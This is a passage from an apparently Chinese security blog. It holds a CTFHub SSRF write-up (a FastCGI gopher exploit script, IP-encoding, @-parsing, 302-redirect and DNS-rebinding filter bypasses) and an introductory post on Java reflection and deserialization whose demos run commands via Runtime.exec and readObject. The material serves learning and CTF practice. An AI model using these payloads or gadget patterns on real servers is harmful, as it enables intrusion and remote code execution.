client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' } response = client.request(params, content) 同时可以在vps或者kali上开启监听，这里我用kali监听，并且将监听到的流量给了1.txt 同时我们在本地上执行上述exp 得到1.txt我们需要对其中的内容进行两次url编码 python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件] import urllib.parse file= open('1.txt','rb') payload= file.read() payload= urllib.parse.quote(payload).replace(\"%0A\",\"%0A%0D\") print(\"gopher://127.0.0.1:9000/_\"+urllib.parse.quote(payload)) 将得到的内容直接传入url即可，如下图可以看到虽然乱码，但是我们知道了当前flag文件的位置了 接下来就是进行读取了，步骤同上述即可 URL Bypass 至于那个打Redis的放在其他文章了，这里懒得在写一次了。 这里根据提示url后面必须以上面的开头，直接@绕过： 采用http基本身份认证的方式绕过： 如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异 在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。 详情可参考PHP官方文档 构造：?url=http://notfound.ctfhub.com@127.0.0.1/flag.php即可 数字IP Bypass 题目提示：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢 这里看到了ban的信息，127、172、@、. 均被过滤，这里看到一个IP进制转换的网址很不错： https://tool.520101.com/wangluo/jinzhizhuanhuan/ 我们对上述的进制一个个尝试一下，发现十进制的可以利用 tips： 127.0.0.1：八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433 IP地址转为八、十、十六进制及IP地址省略写法（以下均代表127.0.0.1） 0177.00.00.01 2130706433 0x7f.0x0.0x0.0x1 127.1 302跳转 Bypass 题目提示：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧 我们先利用file协议读取源码： &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])) { header(\"Location: /?url=_\"); exit; } $url = $_REQUEST['url']; if (preg_match(\"/127|172|10|192/\", $url)) { exit(\"hacker! Ban Intranet IP\"); } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); 不过可以看到这里的过滤并不全，利用进制转换依旧可以绕过，但我们还是要学一下302跳转的。 原理：需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中，服务端代码如下： &lt;?php header(\"Location: http://127.0.0.1/flag.php\"); #这里输入你想要访问的内网IP exit(); ?&gt; DNS重绑定 Bypass 题目提示：关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助 &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])) { header(\"Location: /?url=_\"); exit; } $url = $_REQUEST['url']; if (preg_match(\"/127|172|10|192/\", $url)) { exit(\"hacker! Ban Intranet IP\"); } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); 源码没变，依照题目的意思：我们知道我们在输入域名的时候，对方的DNS服务器会将其解析为对应IP地址，随后判断IP地址是否安全，如果安全在curl去请求这个IP地址，但从这个解析判断到curl请求的过程中有一个时间差，我们可以利用该时间差进行攻击。 先搞一个域名让其解析的IP地址为一个安全的，随后在对方服务器成功解析并判断IP安全之后，在将域名绑定为127.0.0.1等内网IP，随后成功绕过限制而被curl去请求。这里用到个网站： https://lock.cmpxchg8b.com/rebinder.html 简单来说我们在上面写一个正常IP，和一个非正常IP，接着这个网站会自动生成一个TTL值很低的域名，这意味着该DNS记录在DNS服务器上的缓存时间就很小，导致修改记录之后在各地的生效时间加快。 意味着如果我们临时改变域名指向的IP，他会很快知悉到这个域名解析变化，并顺应我们的改变快速将域名解析到其他IP。 具体可参考：https://zhuanlan.zhihu.com/p/89426041 0x03 参考文章 http协议参考：HTTP/1.1详解 CTFHub-Web-信息泄露-Git泄露 命令注入–管道符命令的解释参考 CTFHub技能树 Web-SSRF POST请求 CTFHub技能树笔记之SSRF：POST请求、文件上传 SSRF详解 基于CTFHub（上篇）","tags":["CTF赛事"],"categories":["CTFHub系列"]},{"title":"Java反序列化1入门","path":"/2023/12/09/java-fan-xu-lie-hua-1/","content":"0x01 前言 如今CTF比赛中难题或者是压轴题都涉及到Java知识，可见Java安全的火爆程度，如今看了小迪的涉及到Java反序列化1的课程，也想着是时候初步学习一下了。故此文章用来入门Java反序列化1，后续遇到新知识在写吧。 0x02 Java反射 跟着师傅的路线先了解一下Java反射 Java正射 例子，这是一个person类，有成员变量以及函数： package 反射; public class Person { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void show(){ System.out.println(\"hello\"); } } 我们在编写代码时，当需要使用到某一个类的时候，都会先了解这个类是做什么的。然后实例化这个类，接着用实例化好的对象进行操作，这就是正射。 package 反射; import 反射.Person; public class 正射 { public static void main(String[] args) { Person person1 =new Person(); person1.setName(\"小明\"); person1.setAge(18); System.out.println(person1.getName()); System.out.println(person1.getAge()); Class c = person1.getClass();//Class 类的对象作用是运行时提供或获得某个对象的类型信息。 System.out.println(c); person1.show(); } } Java反射机制 Java反射(Reflection)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。Java反射机制是Java语言的动态性的重要体现，也是Java的各种框架底层实现的灵魂。 Java 反射组成相关的类 反射机制相关操作一般位于java.lang.reflect包中，而java反射机制组成需要重点注意以下的类： java.lang.Class：类对象; java.lang.reflect.Constructor：类的构造器对象; java.lang.reflect.Field：类的属性对象; java.lang.reflect.Method：类的方法对象; 反射调用方法： 获取类的方法：forName 实例化类对象的方法：newInstance 获取函数的方法：getMethod 执行函数的方法：invoke 获取Class对象 Class 类是描述类的类，作用是运行时提供或获得某个对象的类型信息。 获取类的实例有以下的三种方法： 方法一、实例化对象的getClass()方法 如果上下⽂中存在某个类的实例 obj，那么我们可以通过 obj.getClass 来获取它的类。 TestReflection testReflection = new TestReflection(); Class class1 = testReflection.getClass(); 方法二、 使用类的 .class 方法 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。 Class class2 = TestReflection.class; 方法三、Class.forName(String className)：动态加载类 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取 Class class3 = Class.forName(\"reflection.TestReflection\"); 我们可以写个简单的示例代码，分别利用这三种方法获取当前类Class对象的当前类名。 此外还有一种获取类class的方法：classLoader.loadClass(\"com.anbai.sec.classloader.TestReflection\"); package 反射; import 反射.Person; public class Reflect{ public static void main(String[] args) throws Exception{ // 类的 .class 属性 Class c1 = Person.class; System.out.println(c1.getName()); // 实例化对象的 getClass() 方法 Person person = new Person(); Class c2 = person.getClass(); System.out.println(c2.getName()); // Class.forName(String className): 动态加载类 Class c3 = Class.forName(\"反射.Person\"); System.out.println(c3.getName()); } } 我们一般使用第三种通过Class.forName方法去动态加载类。且使用forName就不需要import导入其他类，可以加载我们任意的类。 而使用类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误； 而使用实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。 所以我们在获取class对象中，一般使用Class.forName方法去获取。 反射常用函数 getMethod()方法获取的是当前类中所有公共(public)方法。包括从父类里继承来的方法。 getDeclaredMethod()系列方法获取的是当前类中“声明”的方法，包括private，protected 和public，不包含从父类继承来的方法。 getConstructor()方法获取的是当前类声明为公共(public)构造函数实例。 getDeclaredConstructor()方法获取的是当前类声明的构造函数实例，包括private， protected和public。 setAccessible()在获取到私有方法或构造方法后，使用 setAccessible(true)，改变其作用域，这样即使是私有的属性，方法，构造函数也都可以访问调用了 newInstance()将获取到的对象实例化。调用的是这个类的无参构造函数。使用 newInstance 不成功的话可能是因为：①、你使用的类没有无参构造函数，②、你使用的类构造函数是私有的。 invoke()调用包装在当前Method对象中的方法。 通过反射创建类对象 通过反射创建类对象主要有两种方式：通过 Class 对象的 newInstance() 方法、通过 Constructor 对象的 newInstance() 方法。 第一种：通过 Class 对象的 newInstance() 方法。 Class clz = Apple.class; Apple apple = (Apple)clz.newInstance(); 第二种：通过 Constructor 对象的 newInstance() 方法 Class clz = Apple.class; Constructor constructor = clz.getConstructor(); Apple apple = (Apple)constructor.newInstance(); 通过 Constructor 对象创建类对象可以选择特定构造方法，而通过 Class 对象则只能使用默认的无参数构造方法。下面的代码就调用了一个有参数的构造方法进行了类对象的初始化。 Class clz = Apple.class; Constructor constructor = clz.getConstructor(String.class, int.class); Apple apple = (Apple)constructor.newInstance(\"红富士\", 15); newInstance() 该方法属于 Class 类，执行后返回一个 Object，可以利用这个方法来实例化对应的类，作用就是调用这个类的无参构造函数。但要求要实例化的类必须要有无参构造函数，并且这个构造函数不是私有的。 Runtime类的分析 进入 Runtime 类中可以看到 这里可以看到Runtime类为单例模式，这意味着我们只能通过getRuntime方法来获取Runtime对象。同时注意 getRuntime 对象是静态方法，即可以直接通过 类名.方法名 的方法调用。 java执行命令 Runtime run = Runtime.getRuntime();//获取 Runtime 对象 run.exec(\"calc\");//执行calc命令弹出计算器 getMethod() 该方法可获取一个 Method 对象，即获取类中的方法，通常要和 invoke() 方法一起使用，这里重点关注下它的各项参数 第一个参数name是所要获取方法的方法名，第二个参数parameterTypes是所获得的方法中参数的类型，parameterTypes 是个 Class 类型的数组，用的是java的可变长参数的写法，&lt;?&gt; 是泛型的表示，这里不探讨。 即参数类型 Class&lt;?&gt;... parameterTypes 其实等价于 Class&lt;?&gt;[] parameterTypes 。传递的对应参数是所获取方法的对应的参数类型。比如 Runtime 中的 exec(String command) 函数，获取它就是 Class clazz = Class.forName(\"java.lang.Runtime\"); Method cmd = clazz.getMethod(\"exec\", String.class); Invoke() invoke() 方法用于执行 getMethod 获取的方法，看看它的相关参数 第一个参数是函数所在的类对象，第二个是所执行的函数的对象参数：依旧拿 exec(String command) 方法来说 Runtime run = Runtime.getRuntime();//获取Runtime对象 Class clazz = Class.forName(\"java.lang.Runtime\"); Method cmd = clazz.getMethod(\"exec\", String.class); cmd.invoke(run, \"calc\");//执行函数 如果执行的方法是静态方法，那么 invoke 的第一个 obj 参数将被忽略 比如我们要执行上面所说的 Runtime 类中的静态方法 getRuntime() 去获取对象 Class clazz = Class.forName(\"java.lang.Runtime\"); //调用静态方法getRuntime()获取Runtime对象 Runtime run = (Runtime) clazz.getMethod(\"getRuntime\").invoke(null);//调用的是静态方法，invoke()里参数随便写一个就行，会忽略第一个参数 run.exec(\"calc\"); 等价于 Runtime.getRuntime().exec(\"calc\"); 反射java.lang.Runtime java.lang.Runtime因为有一个exec方法可以执行本地命令，所以在很多的payload中我们都能看到反射调用Runtime类来执行本地系统命令，通过学习如何反射Runtime类也能让我们理解反射的一些基础用法。 不使用反射执行本地命令代码片段： // 输出命令执行结果 System.out.println(org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"whoami\").getInputStream(), \"UTF-8\")); 如上可以看到，我们可以使用一行代码完成本地命令执行操作，但是如果使用反射就会比较麻烦了，我们不得不需要间接性的调用Runtime的exec方法。 反射Runtime执行本地命令代码片段： // 获取Runtime类对象 Class runtimeClass1 = Class.forName(\"java.lang.Runtime\"); // 获取构造方法 Constructor constructor = runtimeClass1.getDeclaredConstructor(); constructor.setAccessible(true); // 创建Runtime类示例，等价于 Runtime rt = new Runtime(); Object runtimeInstance = constructor.newInstance(); // 获取Runtime的exec(String cmd)方法 Method runtimeMethod = runtimeClass1.getMethod(\"exec\", String.class); // 调用exec方法，等价于 rt.exec(cmd); Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd); // 获取命令执行结果 InputStream in = process.getInputStream(); // 输出命令执行结果 System.out.println(org.apache.commons.io.IOUtils.toString(in, \"UTF-8\")); 反射调用Runtime实现本地命令执行的流程如下： 反射获取Runtime类对象(Class.forName(\"java.lang.Runtime\"))。 使用Runtime类的Class对象获取Runtime类的无参数构造方法(getDeclaredConstructor())，因为Runtime的构造方法是private的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(constructor.setAccessible(true))。 获取Runtime类的exec(String)方法(runtimeClass1.getMethod(\"exec\", String.class);)。 调用exec(String)方法(runtimeMethod.invoke(runtimeInstance, cmd))。 上面的代码每一步都写了非常清晰的注释，接下来我们将进一步深入的了解下每一步具体含义。 Java反射到命令执行 学习ava反射机制，其实我们更关心如何利用Java反射实现命令执行。下面是Java反射命令执行的几种情况 Demo 1 package 反射; public class TrainPrint { { System.out.printf(\"Empty block initial %s \", this.getClass()); } static { System.out.printf(\"Static initial %s \", TrainPrint.class); try { Runtime rt = Runtime.getRuntime(); String[] commands = {\"calc\"}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } } public TrainPrint() { System.out.printf(\"Initial %s \", this.getClass()); } } package 反射; import 反射.TrainPrint; public class exp { public static void main(String[] args) throws Exception { ref(\"反射.TrainPrint\"); } //假设name 参数可控，我们使用runtime来弹计算器： public static void ref(String name) throws Exception { Class.forName(name); } } 可以看到在TrainPrint类中，定义了一个实例化函数块、静态初始化块以及构造函数；在exp类中，则是定义了一个main函数来调用ref函数。 在ref函数中，对传入的name参数，会用forName函数去加载并初始化name对应的类，而在这里也就是“反射.TrainPrint”类，而加载该类之后，回去调用类中对应的静态初始化块函数，也就是上述执行exec(“calc”)代码，最终弹出计算器。 而这里呢，如果我们对name可控，那就可以构造恶意类进行攻击了 Demo 2 下面是两种通过反射java.lang.Runtime来达到命令执行的方式。 由于java.lang.Runtime类的构造函数是私有的，因此不能直接使用 newInstance() 创建一个实例。那为什么这个类的构造函数会是私有的呢？ 这涉及到一个“单例模式”的概念： 单例模式（Singleton）的目的是为了保证在一个进程中，某个类有且仅有一个实例。因为这个类只有一个实例，因此，自然不能让调用方使用new Xyz()来创建实例了。所以，单例的构造方法必须是private，这样就防止了调用方自己创建实例，但是在类的内部，是可以用一个静态字段来引用唯一创建的实例的。举个例子：我们在链接数据库时只有最开始链接一次，而不是用一次链接一次，如果这样的话，资源消耗太大了。因此可以将类的构造函数设为私有，再通过静态方法来获取。 由于java.lang.Runtime使用了单例模式，我们可以通过Runtime.getRuntime()来获取Runtime对象。 有两种方法进行反射命令执行： getMethod package RCE; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Reflect { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class clazz; clazz = Class.forName(\"java.lang.Runtime\"); Method execMethod = clazz.getMethod(\"exec\", String.class); Method getRuntimeMethod = clazz.getMethod(\"getRuntime\"); Object runtime = getRuntimeMethod.invoke(clazz); execMethod.invoke(runtime, \"calc.exe\"); } } 这里由于我们无法直接实例化Runtime类，因此只能靠Java反射机制： 首先定义了一个Class对象clazz，然后通过forName方法，获取到了Runtime类的Class对象（也就是能得到Runtime类中的数据及方法）。随后利用getMethod方法调用了clazz（即Runtime类）中的exec方法，为后续命令执行做准备。 然后又通过getMethod获取到Runtime类中的getRuntime方法，接着通过invoke进行调用该方法执行： 也就是执行Runtime.getRuntime成功获取到Runtime类的对象，并赋值给runtime实例。 最终用invoke方法调用了runtime实例的exec方法，并传入相应参数，成功弹出计算器。 getDeclaredConstructor package RCE; import java.io.InputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Reflect { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class runtimeClass1 = Class.forName(\"java.lang.Runtime\"); Constructor constructor = runtimeClass1.getDeclaredConstructor(); constructor.setAccessible(true); Object runtime = constructor.newInstance(); Method runtimeMethod = runtimeClass1.getMethod(\"exec\", String.class); runtimeMethod.invoke(runtime, \"calc\"); } } 首先通过forName获取Runtime的Class类对象 Class对象提供了关于类或接口的结构和行为的信息，包括类的名称、父类、实现的接口、字段、方法等。 需要注意，这里的class对象并不能直接调用某种方法，还需要利用反射机制才可 之后利用getDeclaredConstructor函数获取到了Runtime类中的私有构造函数，接着设置setAccessible(true)使得我们可以调用其私有构造函数。 接着利用constructor的newInstance就可以实例化一个Runtime类对象了，之后通过Class对象调用getMethod方法获取到Runtime类的exec方法。 最后利用invoke执行，弹出计算器。 注意：这里我用的是jdk1.8，如果是jdk9以上，对于这种反射机制会爆出如下错误： Unable to make private java.lang.Runtime() accessible: module java.base does not \"opens java.lang\" to unnamed module... 解决办法可参考：[Getting java.lang.reflect.InaccessibleObjectException when migrated to Java 17](https://community.temporal.io/t/getting-java-lang-reflect-inaccessibleobjectexception-when-migrated-to-java-17/6168) 但这里我就换了个低版本，懒得解决了 getConstructor和getDeclaredConstructor 这两个方法均用于获取类的构造方法，后者可以获取私有的构造方法 前面利用 Class 中的 newInstance 方法获取一个类对象只能是对应无参的构造函数来实例化类，而利用这两个函数可以调用类的有参构造函数来实例化一个对象。 这里以 getConstructor 为例，getDeclaredConstructor 用法相同只是后续要加个 setAccessible(true) 该方法的参数是获取到的构造方法中对应参数的数据类型，该方法返回的 Constructor 对象中有个 newInstance 方法，看看这个 newInstance 方法的参数 newInstance 方法的参数是调用的构造方法对应的参数。比如我们利用 ProcessBuilder 类来执行命令 new ProcessBuilder(\"calc\").start(); 注意这里用到的 ProcessBuilder 重载的构造方法 String... command` 等价于 `String[] command 使用反射构造 Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(new String[][] {{\"calc\"}})).start(); 简单解释下这两个参数 String[].class 是 ProcessBuilder 类构造函数的参数类型，newInstance 参数也是可变长参数，等价于 Object[] initargs ，即套两层数组 new String[][] {{\"calc\"}} 上述用到了强制类型转换，将上述payload改改，用完全反射的方法 Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); Constructor m = clazz.getConstructor(String[].class); clazz.getMethod(\"start\").invoke(m.newInstance(new String[][] {{\"calc\"}})); 写成一行 Class.forName(\"java.lang.ProcessBuilder\").getMethod(\"start\").invoke(Class.forName(\"java.lang.ProcessBuilder\").getConstructor(String[].class).newInstance(new String[][] {{\"calc\"}})); runtimeClass1.getDeclaredConstructor和runtimeClass1.getConstructor都可以获取到类构造方法，区别在于后者无法获取到私有方法，所以一般在获取某个类的构造方法时候我们会使用前者去获取构造方法。如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组，如：clazz.getDeclaredConstructor(String.class, String.class)。 如果我们想获取类的所有构造方法可以使用：clazz.getDeclaredConstructors来获取一个Constructor数组。 获取到Constructor以后我们可以通过constructor.newInstance()来创建类实例,同理如果有参数的情况下我们应该传入对应的参数值，如:constructor.newInstance(\"admin\", \"123456\")。当我们没有访问构造方法权限时我们应该调用constructor.setAccessible(true)修改访问权限就可以成功的创建出类实例了。 反射调用类方法 Class对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法。 获取当前类所有的成员方法： Method[] methods = clazz.getDeclaredMethods() 获取当前类指定的成员方法： Method method = clazz.getDeclaredMethod(\"方法名\"); Method method = clazz.getDeclaredMethod(\"方法名\", 参数类型如String.class，多个参数用\",\"号隔开); getMethod和getDeclaredMethod都能够获取到类成员方法，区别在于getMethod只能获取到当前类和父类的所有有权限的方法(如：public)，而getDeclaredMethod能获取到当前类的所有成员方法(不包含父类)。 反射调用方法 获取到java.lang.reflect.Method对象以后我们可以通过Method的invoke方法来调用类方法。 调用类方法代码片段： method.invoke(方法实例对象, 方法参数值，多个参数值用\",\"隔开); method.invoke的第一个参数必须是类实例对象，如果调用的是static方法那么第一个参数值可以传null，因为在java中调用静态方法是不需要有类实例的，因为可以直接类名.方法名(参数)的方式调用。 method.invoke的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的依次传入对应的参数类型。 反射调用成员变量 Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。 获取当前类的所有成员变量： Field fields = clazz.getDeclaredFields(); 获取当前类指定的成员变量： Field field = clazz.getDeclaredField(\"变量名\"); getField和getDeclaredField的区别同getMethod和getDeclaredMethod。 获取成员变量值： Object obj = field.get(类实例对象); 修改成员变量值： field.set(类实例对象, 修改后的值); 同理，当我们没有修改的成员变量权限时可以使用: field.setAccessible(true)的方式修改为访问成员变量访问权限。 如果我们需要修改被final关键字修饰的成员变量，那么我们需要先修改方法 // 反射获取Field类的modifiers Field modifiers = field.getClass().getDeclaredField(\"modifiers\"); // 设置modifiers修改权限 modifiers.setAccessible(true); // 修改成员变量的Field对象的modifiers值 modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL); // 修改成员变量值 field.set(类实例对象, 修改后的值); 0x02 什么是Java序列化与反序列化 在编程语言的世界当中,常常有这样的需求,我们需要将本地已经实例化的某个对象,通过网络传递到其他机器当中.为了满足这种需求,就有了所谓的序列化和反序列化 Java: 1. 序列化：将Java对象压缩成字节序列或字节流的形式 2. 反序列化：将字节序列或字节流转化成Java对象 对象的序列化主要有两种用途： 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象） 在网络上传送对象的字节序列。（网络传输对象） 0x03 漏洞成因 只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。 3.1 可能的形式 入口类的readObject直接调用危险方法 入口类参数中包含可控类，该类有危险方法，readObject时调用 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用 比如类型定义为Object，调用equals/hashcode/toString 相同类型 同名函数 构造函数/静态代码块等类加载时隐式执行 3.2 JAVA原生反序列化漏洞成因 Java中间件通常通过网络接收客户端发送的序列化数据，而在服务端对序列化数据进行反序列化时，会调用被序列化对象的readObject()方法。 而在Java中如果重写了某个类的方法，就会优先调用经过修改后的方法。 如果某个对象重写了readObject()方法，且在方法中能够执行任意代码，那服务端在进行反序列化时，也会执行相应代码 简单来说：攻击者通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的恶意代码。 0x04 Java反序列化基础 不同于PHP序列化是将对象转换成了字符串，Java序列化是将对象转换为了字节流，且序列化与反序列化是一种思想，并不局限于其实现形式。如： JAVA内置的writeObject()/readObject() JAVA内置的XMLDecoder()/XMLEncoder XStream SnakeYaml FastJson Jackson 出现过漏洞的组件： Apache Shiro Apache Axis Weblogic Jboss Fastjson 看一下Java中执行系统命令的方法： public class Main { public static void main(String[] args) throws Exception{ Runtime.getRuntime().exec(\"calc.exe\"); } } Java中执行系统命令使用java.lang.Runtime类的exec方法： 以上函数可以弹出计算器 getRuntime()是Runtime类中的静态方法,使用此方法获取当前java程序的Runtime(即运行时:计算机程序运行需要的代码库,框架,平台等) exec底层为ProcessBuilder:此类用于创建操作系统进程，每个ProcessBuilder实例管理进程属性的集合。 start()方法使用这些属性创建一个新的Process实例。 start()方法可以从同一实例重复调用，以创建具有相同或相关属性的新子进程。 注意:这里的命令执行,并不是使用系统中的bash或是cmd进行的系统命令执行，而是使用JAVA本身，所以反弹shell的重定向符在JAVA中并不支持 我们来细分一下上述执行命令的步骤： public class Main { public static void main(String[] args) throws Exception{ Runtime runtime = Runtime.getruntime(); runtime.exec(\"calc.exe\"); } } 那么相应的反射的代码如下 import java.lang.reflect.Method; public class ExecTest { public static void main(String[] args) throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); //System.out.println(runtime.getClass().getName()); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc.exe\"); } } getMethod(方法名, 方法类型) invoke(某个对象实例， 传入参数) 这里第一句Object runtime = Class.forName(\"java.lang.Runtime\")的作用等价于 Object runtime = Runtime.getRuntime() 目的是获取一个对象实例好被下一个invoke调用 第二句Class.forName(\"java.lang.Runtime\").xxxx的作用就是调用上一步生成的runtime实例的exec方法，并将\"calc.exe\"参数传入exec()方法 接下来编写Java反序列化过程： 在Java当中，如果一个类需要被序列化和反序列化 ，需要实现java.io.Serializable接口 ObjectOutputStream类的writeObject(Object obj)方法，将对象序列化成字符串数据 ObjectInputStream类的readObject(Object obj)方法，将字符串数据反序列化成对象 import java.io.*; public class Serialize { public static void main(String[] args) throws Exception{ //要序列化的数据 String name = \"hybcx\"; //序列化 FileOutputStream fileOutputStream = new FileOutputStream(\"serialize1.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(name); objectOutputStream.close(); //反序列化 FileInputStream fileInputStream = new FileInputStream(\"serialize1.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); } } 我们用010编辑器打开上述生成的文件看看 可见上述十六进制是以aced开头的，这里说一下Java序列化特性： 一段数据以 rO0AB 开头，你基本可以确定这串就是 JAVA 序列化 base64 加密的数据。 或者如果以 aced 开头，那么他就是这一段 java 序列化的 16 进制。 且0005 为 Java 对象序列化的版本号 import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Serialize2 { public static void main(String[] args) throws Exception{ //要序列化的数据 Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Object evil = Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(runtime, \"calc.exe\"); //Object evil = Runtime.getRuntime().exec(\"calc.exe\"); //序列化 FileOutputStream fileOutputStream = new FileOutputStream(\"serialize2.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(evil); objectOutputStream.close(); //反序列化 FileInputStream fileInputStream = new FileInputStream(\"serialize2.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); } } 这里如果我们直接运行会发现报错，但计算器是成功弹出的，这是因为上述Runtime类没有继承Serializable接口，所以导致不会成功，它弹是在写Object的时候弹出来的 我们如果跟进java.io.Serializable接口会发现如下图，是一个空类，有位师傅这样解释：这说明起作用只是为了在反序列化和序列化中，做一个类型判断。为什么呢？因为遵循非必要原则，不需要反序列化的类就可以不用反序列化了。 4.1 如何序列化类 Java原生实现了一套序列化的机制，它让我们不需要额外编写代码，只需要实现java.io.Serializable接口，并调用ObjectOutputStream类的writeObject方法即可 Person类实现： package serializable; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; /* * implements Serializable:序列化的前提,需要实现这个接口 * Serializable:表示这个类的成员可以被序列化 */ public class Person implements Serializable { private static final long serialVersionUID = 1L; // 添加一个 transient 关键字,则name属性不会被序列化和反序列化 // 如果将属性设置为static,同样不会被序列化和反序列化 // private transient String name; public String name; private int age; public Person(){ } public Person(String name, int age) { this.name = name; this.age = age; } /* * @Override是Java5的元数据,自动加上去的一个标志,告诉你说下面这个方法是从父类/接口 * 继承过来的,需要你重写一次,这样就可以方便你阅读,也不怕会忘记 * @Override是伪代码,表示重写(当然不写也可以),不过写上有如下好处: * 1. 可以当注释用,方便阅读 * 2. 编译器可以给你验证@Override下面的方法名是否是你父类中所有的,如果没有则报错 * 比如你如果没写@Override而你下面的方法名又写错了,这时你的编译器是可以通过的(它以为这个方法是你的子类中自己增加的方法) * 使用该标记是为了增强程序在编译时候的检查,如果该方法并不是一个覆盖父类的方法,在编译时编译器就会报告错误 */ @Override public String toString() { return \"Person{\" + \"name='\" + name + '\\'' + \",age=\" + age + '}'; } private void readObject(ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException { /* * java.io.ObjectInputStream.defaultReadObject() * 方法用于从这个ObjectInputStream读取当前类的非静态和非瞬态字段.它间接地涉及到该类的readObject()方法的帮助. * 如果它被调用,则会抛出NotActiveException */ objectInputStream.defaultReadObject(); /* * 每个Java应用程序都有一个Runtime类的Runtime ,允许应用程序与运行应用程序的环境进行接口.当前运行时可以从getRuntime方法获得. */ /* * exec:在具有指定环境的单独进程中执行指定的字符串命令 */ Runtime.getRuntime().exec(\"calc.exe\"); } } Serializable类实现： package serializable; import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class Serializable { public static void serializable(Object person) throws IOException { /* * ObjectOutputStream将Java对象的原始数据类型和图形写入OutputStream.可以使用ObjectInputStream读取（重构） * 对象.可以通过使用流的文件来实现对象的持久存储.如果流是网络套接字流,则可以在另一个主机上或另一个进程中重构对象. */ /* * 文件输出流是用于将数据写入到输出流File或一个FileDescriptor * .文件是否可用或可能被创建取决于底层平台.特别是某些平台允许一次只能打开一个文件来写入一个FileOutputStream * （或其他文件写入对象）.在这种情况下,如果所涉及的文件已经打开,则此类中的构造函数将失败. * FileOutputStream用于写入诸如图像数据的原始字节流. 对于写入字符流,请考虑使用FileWriter . */ // 